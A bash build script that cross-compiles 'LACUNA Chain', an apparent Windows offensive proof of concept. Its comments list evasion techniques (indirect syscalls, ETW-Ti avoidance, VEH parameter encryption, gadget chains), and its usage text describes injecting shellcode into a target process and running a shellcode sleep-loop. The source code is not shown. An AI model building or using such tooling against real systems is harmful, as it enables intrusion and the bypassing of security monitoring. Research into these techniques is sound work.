#!/bin/bash
# Build LACUNA Chain PoC for Windows x64
# Cross-compile from Linux using mingw-w64
#
# Techniques implemented:
#   BYOUD-Gap, BYOUD-MF, BYOUD-RT, ETW-Ti APC window,
#   parameter encryption (HW breakpoint VEH), indirect syscalls,
#   ghost gadget scanning, win32u NOP gap chain,
#   section-based APC injection

set -e

CC=x86_64-w64-mingw32-gcc
CFLAGS="-O2 -s -masm=intel -fno-omit-frame-pointer -Wall -Wno-unused-function -Wno-frame-address"
LIBS="-lkernel32 -lntdll"

echo "[*] Building LACUNA Chain PoC..."
$CC $CFLAGS -o lacuna.exe lacuna_chain.c $LIBS
echo "[+] Built: lacuna.exe ($(stat -c%s lacuna.exe) bytes)"

echo "[*] Building LACUNA Sleep..."
$CC $CFLAGS -o lacuna_sleep.exe lacuna_sleep.c $LIBS
echo "[+] Built: lacuna_sleep.exe ($(stat -c%s lacuna_sleep.exe) bytes)"

echo ""
echo "usage:"
echo "  lacuna.exe scan                     enumerate ghost regions + gadgets"
echo "  lacuna.exe verify                   build chain and walk L0->L1->L2->L3->L4->L5"
echo "  lacuna.exe inject <pid> <sc.bin>    section-based APC injection with full chain"
echo "  lacuna_sleep.exe                    demo mode (3 cycles, test payload)"
echo "  lacuna_sleep.exe <sc.bin> [ms]      sleep-loop with real shellcode"
